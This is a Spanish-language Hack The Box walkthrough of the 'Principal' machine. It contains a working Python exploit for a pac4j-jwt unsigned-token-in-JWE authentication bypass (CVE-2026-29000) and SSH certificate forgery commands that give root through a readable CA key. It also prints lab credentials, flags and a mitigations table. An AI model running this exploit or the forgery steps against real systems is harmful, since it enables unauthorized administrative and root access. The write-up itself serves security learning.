---
title: "HTB Walkthrough: Principal"
date: 2026-04-14
draft: false
description: "Walkthrough completo de la máquina Principal de Hack The Box. Dificultad Medium, OS Linux (Ubuntu 24.04 LTS)."
tags: ["HackTheBox", "Linux", "Medium", "JWT", "SSH", "CVE-2026-29000"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución paso a paso de **Principal** en Hack The Box. Máquina de dificultad **Medium** con sistema operativo **Linux (Ubuntu 24.04 LTS)**. Cubrimos bypass de autenticación JWT, extracción de credenciales desde dashboard y escalada de privilegios mediante forja de certificados SSH.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                              |
|----------------|----------------------------------------------------------------------|
| **Nombre**     | Principal                                                            |
| **OS**         | Linux (Ubuntu 24.04 LTS)                                             |
| **Dificultad** | Medium                                                               |
| **IP**         | 10.129.244.220                                                       |
| **Técnicas**   | CVE-2026-29000 (pac4j-jwt PlainJWT Bypass), SSH Certificate Forgery |

---

## 🔎 Reconocimiento

### Escaneo de Puertos — Descubrimiento Inicial

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.244.220
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

### Escaneo de Versiones y Scripts

```bash
nmap -sC -sV -p22,8080 10.129.244.220
```

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
| X-Powered-By: pac4j-jwt/6.0.3
```

*Puertos abiertos:*
- `22` → `OpenSSH 9.6p1`
- `8080` → `Jetty (pac4j-jwt/6.0.3)`

> **💡 Datos clave del escaneo:** Puerto 8080 aloja una aplicación web Java sobre **Jetty** autenticada con **pac4j-jwt versión 6.0.3**. La cabecera `X-Powered-By` nos da la librería y su versión exacta, pista directa para buscar CVEs.

### Enumeración Web — Análisis del Frontend

La página principal muestra un formulario de login corporativo. El archivo `/static/js/app.js` revela la arquitectura de autenticación:

```js
// Endpoints disponibles
const JWKS_ENDPOINT      = '/api/auth/jwks';  // Clave pública RSA — acceso público
const AUTH_ENDPOINT      = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT     = '/api/users';
const SETTINGS_ENDPOINT  = '/api/settings';

// Roles del sistema
const ROLES = {
    ADMIN:   'ROLE_ADMIN',
    MANAGER: 'ROLE_MANAGER',
    USER:    'ROLE_USER'
};

// Token handling:
//   - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
//   - Public key available at /api/auth/jwks for token verification
//   - Inner JWT is signed with RS256
//
// JWT claims schema:
//   sub  - username
//   role - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
//   iss  - "principal-platform"
```

> **💡 Conclusiones del análisis:**
> 1. El sistema usa **JWE** — el token está cifrado con la clave pública RSA del servidor.
> 2. Dentro del JWE hay un **JWT** firmado con RS256.
> 3. La **clave pública** está disponible sin autenticación en `/api/auth/jwks`.
> 4. El campo `role` en los claims controla el acceso — si lo falsificamos, podemos escalar a `ROLE_ADMIN`.

---

## 🚪 Foothold / Explotación

### Identificación de la Vulnerabilidad — CVE-2026-29000

La versión **pac4j-jwt 6.0.3** es vulnerable al **CVE-2026-29000**, que afecta a versiones anteriores a 4.5.9, 5.7.9 y 6.3.3.

El fallo reside en cómo pac4j procesa los tokens JWE cuando el contenido interno es un **PlainJWT** (`"alg": "none"`).

**Flujo normal:**
```
JWE (cifrado RSA-OAEP-256) → contiene → JWT firmado RS256 → claims verificados
```

**Flujo malicioso:**
```
JWE (cifrado con clave pública del servidor) → contiene → PlainJWT ("alg":"none") → claims aceptados sin verificar firma
```

pac4j descifra el JWE correctamente, pero cuando el JWT interno tiene `"alg": "none"`, la función `toSignedJWT()` devuelve `null` en lugar de lanzar un error. El código vulnerable acepta ese `null` como válido y extrae los claims del PlainJWT **sin verificar ninguna firma**, permitiendo al atacante fijar el `role` que quiera.

### Script de Explotación

```python
#!/usr/bin/env python3
import json, time, base64, requests, sys
from jwcrypto import jwk, jwe

if len(sys.argv) < 2:
    print(f"Uso: python3 {sys.argv[0]} <URL_BASE>")
    sys.exit(1)

TARGET_URL         = sys.argv[1].rstrip('/')
JWKS_ENDPOINT      = f"{TARGET_URL}/api/auth/jwks"
PROTECTED_ENDPOINT = f"{TARGET_URL}/api/dashboard"

def b64_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# 1. Obtener la clave pública RSA desde el endpoint público
print(f"[*] Obteniendo clave pública de {JWKS_ENDPOINT}...")
r = requests.get(JWKS_ENDPOINT, timeout=10)
key_data   = r.json()['keys'][0]
public_key = jwk.JWK(**key_data)
print(f"[+] Clave RSA '{key_data.get('kid')}' cargada correctamente.")

# 2. Construir los claims maliciosos con ROLE_ADMIN
now = int(time.time())
claims = {
    "sub":  "admin#override",
    "role": "ROLE_ADMIN",         # Claim de privilegio máximo
    "iss":  "principal-platform",
    "iat":  now,
    "exp":  now + 3600
}

# 3. Construir el PlainJWT (alg: none — sin firma)
header_plain     = b64_encode(json.dumps({"alg": "none"}).encode())
payload_plain    = b64_encode(json.dumps(claims).encode())
plain_jwt_string = f"{header_plain}.{payload_plain}."
print("[*] PlainJWT (sin firma) generado.")

# 4. Envolver el PlainJWT en un JWE cifrado con la clave pública del servidor
print("[*] Cifrando payload con RSA-OAEP-256...")
jwe_header = {
    "alg": "RSA-OAEP-256",
    "enc": "A256GCM",
    "cty": "JWT",
    "kid": key_data.get('kid')
}
jwe_obj = jwe.JWE(
    plain_jwt_string.encode(),
    recipient=public_key,
    protected=json.dumps(jwe_header)
)
malicious_token = jwe_obj.serialize(compact=True)
print("[+] Token JWE final generado.")

# 5. Enviar el token al endpoint protegido
print(f"[*] Enviando ataque a {PROTECTED_ENDPOINT}...")
headers = {"Authorization": f"Bearer {malicious_token}"}
resp    = requests.get(PROTECTED_ENDPOINT, headers=headers)

print("\n[!] COPIA ESTE TOKEN PARA EL NAVEGADOR:")
print(malicious_token)

print("\n--- [ RESULTADO DEL SERVIDOR ] ---")
print(f"Status Code: {resp.status_code}")
if resp.status_code == 200:
    print("[!!!] BYPASS EXITOSO: Acceso concedido como ADMIN.")
    print(f"Respuesta: {resp.text}")
else:
    print(f"[-] Acceso denegado. Código: {resp.status_code}")
```

```bash
python3 cve.py http://10.129.244.220:8080
```

```
[*] Obteniendo clave pública de http://10.129.244.220:8080/api/auth/jwks...
[+] Clave RSA 'enc-key-1' cargada correctamente.
[*] PlainJWT (sin firma) generado.
[*] Cifrando payload con RSA-OAEP-256...
[+] Token JWE final generado.
[*] Enviando ataque a http://10.129.244.220:8080/api/dashboard...

--- [ RESULTADO DEL SERVIDOR ] ---
Status Code: 200
[!!!] BYPASS EXITOSO: Acceso concedido como ADMIN.
```

La respuesta JSON del dashboard incluye el log de actividad del sistema. Entre las entradas aparece un dato relevante:

```json
{
  "action": "CERT_ISSUED",
  "username": "svc-deploy",
  "details": "SSH certificate issued for deploy-1735400000",
  "timestamp": "2026-03-05T21:43:40.443553"
}
```

### Acceso al Dashboard desde el Navegador

Para navegar por la interfaz completa como administrador, inyectamos el token en el Session Storage:

1. Abrir `http://10.129.244.220:8080/login` en el navegador
2. Abrir DevTools → **F12**
3. Ir a **Storage** → **Session Storage** → `http://10.129.244.220:8080`
4. Crear una entrada nueva:
   - **Key:** `auth_token`
   - **Value:** (pegar el token generado por el script)
5. Navegar a `http://10.129.244.220:8080/dashboard`

En la sección **Settings** del dashboard encontramos credenciales expuestas en texto claro:

```
encryptionKey: D3pl0y_$$H_Now42!
sshCertAuth:   enabled
sshCaPath:     /opt/principal/ssh/
```

> **🔑 Credencial encontrada:** `D3pl0y_$$H_Now42!`
> Cruzando con el usuario `svc-deploy` del log de actividad, tenemos unas credenciales SSH directas.

---

## 🔑 User Flag

```bash
ssh svc-deploy@10.129.244.220
# Password: D3pl0y_$$H_Now42!
```

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
svc-deploy@principal:~$
```

```bash
svc-deploy@principal:~$ cat user.txt
```

{{< spoiler text="user.txt" >}}
`5516b5748a367aab31076adfd86560bc`
{{< /spoiler >}}

---

## 👑 Escalada de Privilegios (PrivEsc)

### Enumeración del Sistema

```bash
svc-deploy@principal:~$ sudo -l
Sorry, user svc-deploy may not run sudo on principal.

svc-deploy@principal:~$ groups
svc-deploy deployers
```

Sin `sudo`. Buscamos qué archivos son accesibles para el grupo `deployers`:

```bash
svc-deploy@principal:~$ find / -group deployers 2>/dev/null
```

```
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca          ← CA privada de SSH accesible para nuestro grupo
```

### Análisis de la Configuración SSH

```bash
svc-deploy@principal:~$ cat /opt/principal/ssh/README.txt
```

```
CA keypair for SSH certificate automation.

This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.

Algorithm: RSA 4096-bit
Created: 2025-11-15
Purpose: Automated deployment authentication
```

```bash
svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf
```

```
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

**¿Por qué es esto explotable?**

La configuración tiene una **misconfiguration crítica**: `TrustedUserCAKeys` está definido, pero **no hay ningún `AuthorizedPrincipalsFile` configurado**. Cuando OpenSSH usa `TrustedUserCAKeys` sin `AuthorizedPrincipalsFile`, acepta cualquier certificado firmado por la CA de confianza siempre que el principal del certificado coincida con el usuario al que se conecta.

Además, `PermitRootLogin prohibit-password` bloquea el login de root por contraseña, pero **permite login por certificado**. Como tenemos acceso de lectura a la CA privada en `/opt/principal/ssh/ca`, podemos firmar un certificado con `root` como principal.

> **💡 El paralelismo con el foothold:** La misma clase de vulnerabilidad que el CVE-2026-29000 — el sistema verifica la envoltura criptográfica (el certificado está firmado por la CA de confianza), pero el atacante controla la afirmación de identidad (el principal del certificado).

### Explotación — Forja de Certificado SSH

**Paso 1 — Generar un nuevo par de claves en `/tmp`:**

```bash
svc-deploy@principal:/tmp$ ssh-keygen -t ed25519 -f /tmp/paw -N ""
```

**Paso 2 — Firmar la clave pública con la CA privada, especificando `root` como principal:**

```bash
svc-deploy@principal:/tmp$ ssh-keygen -s /opt/principal/ssh/ca \
    -I "pwa-root" \
    -n root \
    -V +1h \
    /tmp/paw.pub
```

```
Signed user key /tmp/paw-cert.pub: id "pwa-root" serial 0 for root valid from 2026-04-14T09:51:00 to 2026-04-14T10:51:59
```

> **Parámetros:**
> - `-s /opt/principal/ssh/ca` → Clave privada de la CA
> - `-I "pwa-root"` → Identificador del certificado (arbitrario)
> - `-n root` → **Principal del certificado** — el usuario al que da acceso
> - `-V +1h` → Validez de 1 hora

**Paso 3 — Verificar el certificado:**

```bash
svc-deploy@principal:/tmp$ ssh-keygen -L -f /tmp/paw-cert.pub
```

```
/tmp/paw-cert.pub:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Signing CA: RSA SHA256:bExSfFTUaopPXEM+lTW6QM0uXnsy7CICk0+p0UKK3ps
        Key ID: "pwa-root"
        Valid: from 2026-04-14T09:51:00 to 2026-04-14T10:51:59
        Principals:
                root
        Critical Options: (none)
        Extensions:
                permit-pty
                permit-port-forwarding
```

**Paso 4 — Conectarse como root usando el certificado:**

```bash
svc-deploy@principal:/tmp$ ssh -i /tmp/paw root@localhost
```

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
root@principal:~#
```

✅ **Root obtenido mediante certificado SSH forjado.**

---

## 🏁 Root Flag

```bash
root@principal:~# cat /root/root.txt
```

{{< spoiler text="root.txt" >}}
`6c6f21dacd5682a3cf56a7193be5f550`
{{< /spoiler >}}

---

## 📝 Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

```
Puerto 8080 → pac4j-jwt 6.0.3 (CVE-2026-29000)
        ↓
/api/auth/jwks → Clave pública RSA obtenida sin autenticación
        ↓
PlainJWT ("alg":"none") + ROLE_ADMIN envuelto en JWE válido
        ↓
Bypass de autenticación → Acceso como ROLE_ADMIN al dashboard
        ↓
Settings → encryptionKey: D3pl0y_$$H_Now42! + usuario svc-deploy (del log)
        ↓
SSH como svc-deploy → grupo deployers → /opt/principal/ssh/ca (clave CA privada)
        ↓
ssh-keygen -s ca -n root → Certificado SSH forjado con principal=root
        ↓
ssh -i /tmp/paw root@localhost → Shell como root
```

**Lo que aprendí con esta máquina:**

- El header `X-Powered-By` puede revelar librerías y versiones exactas — siempre revisarlo durante la enumeración web.
- El CVE-2026-29000 explota que pac4j acepta PlainJWT (`alg: none`) dentro de un JWE válido, bypassando completamente la verificación de firma del JWT interno.
- `TrustedUserCAKeys` sin `AuthorizedPrincipalsFile` es una misconfiguration crítica: permite forjar acceso a cualquier usuario del sistema con solo tener acceso a la CA privada.
- `PermitRootLogin prohibit-password` no protege contra autenticación por certificado.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| CVE-2026-29000 (PlainJWT bypass) | Actualizar pac4j-jwt a ≥ 6.3.3; rechazar explícitamente tokens con `alg: none` |
| Clave pública RSA sin autenticación | Proteger `/api/auth/jwks` o limitarlo por IP |
| Credenciales en texto claro en el dashboard | No almacenar secretos en la base de datos accesibles desde la UI |
| CA privada accesible al grupo `deployers` | Usar un HSM o vault; el archivo `ca` no debe ser legible por usuarios de servicio |
| `TrustedUserCAKeys` sin `AuthorizedPrincipalsFile` | Configurar `AuthorizedPrincipalsFile` para limitar los principals válidos por usuario |
| `PermitRootLogin` con certificados activo | Usar `PermitRootLogin no` y gestionar acceso root con `sudo` desde cuentas auditadas |